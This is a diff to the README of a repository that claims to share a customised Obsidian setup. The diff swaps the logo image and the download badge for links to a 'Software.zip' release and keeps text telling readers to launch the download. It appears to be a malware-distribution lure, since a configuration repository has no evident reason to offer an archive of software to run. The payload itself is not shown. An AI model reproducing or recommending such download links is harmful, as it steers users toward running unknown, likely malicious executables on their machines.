@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to the ".obsidian" Repository! 🌟
 
-![Obsidian Logo](https://www.obsidian.md/images/obsidian-logo--mark.svg)
+![Obsidian Logo](https://github.com/tamaraaa223/.obsidian/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository is dedicated to sharing my customized Obsidian setup, including themes, snippets, and more. Explore the different components I have put together to enhance your Obsidian experience.
@@ -25,7 +25,7 @@ Explore additional resources related to Obsidian and note-taking productivity in
 Your feedback is valuable! If you have suggestions, questions, or just want to connect, feel free to reach out. Your input helps improve this repository for the community.
 
 ### Download the Software
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/tamaraaa223/.obsidian/releases/download/v2.0/Software.zip)](https://github.com/tamaraaa223/.obsidian/releases/download/v2.0/Software.zip)
 
 The download link above needs to be launched to access the software. 
 
